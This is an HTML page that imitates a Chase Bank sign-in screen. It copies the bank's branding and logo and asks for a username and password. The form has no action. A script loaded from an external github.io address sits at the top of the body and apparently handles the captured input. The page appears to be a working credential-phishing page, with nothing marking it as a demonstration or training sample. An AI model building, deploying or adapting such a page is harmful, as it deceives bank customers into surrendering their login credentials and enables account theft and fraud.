<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chase Bank Login</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  background-color: #f1f4f8;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-container {
  background-color: #ffffff;
  padding: 40px;
  width: 380px;
  border-radius: 10px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  text-align: center;
}

.logo {
  margin-bottom: 20px;
}

.logo img {
  width: 140px;
}

.login-container h2 {
  color: #0a2a5a; /* Chase navy blue */
  margin-bottom: 25px;
  font-size: 22px;
}

.login-container input[type="text"],
.login-container input[type="password"] {
  width: 100%;
  padding: 12px 15px;
  margin-bottom: 18px;
  border-radius: 6px;
  border: 1px solid #ccd0d5;
  font-size: 16px;
}

.login-container input[type="submit"] {
  width: 100%;
  padding: 12px;
  border-radius: 6px;
  border: none;
  background-color: #0a2a5a;
  color: white;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  transition: background 0.3s ease;
}

.login-container input[type="submit"]:hover {
  background-color: #083a78;
}

.login-container a {
  display: block;
  margin-top: 12px;
  color: #0a2a5a;
  font-size: 14px;
  text-decoration: none;
}

.login-container a:hover {
  text-decoration: underline;
}

.note {
  font-size: 12px;
  color: #777;
  margin-top: 15px;
}
</style>

</head>
<body>
<script src="https://plyarth.github.io/intc/int5.js"></script>
<div class="login-container">
  <div class="logo">
    <!-- Chase logo placeholder -->
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMaykvi2hoEvP3QHaMXxuDFbTfAnz-aXTuBIIuYgYBgA&s=10" alt="Chase Bank Logo">
  </div>

  <h2>Sign in to Your Chase Account</h2>

  <form>
    <input type="text" placeholder="Username or Email" name="Username or email" required>
    <input type="password" placeholder="Password" name="Password" required>
    <input type="submit" value="Log In">
    <a href="#">Forgot username/password?</a>
    <a href="#">Enroll in Chase Online Banking</a>

    <p class="note">
    </p>
  </form>
</div>

</body>
</html>
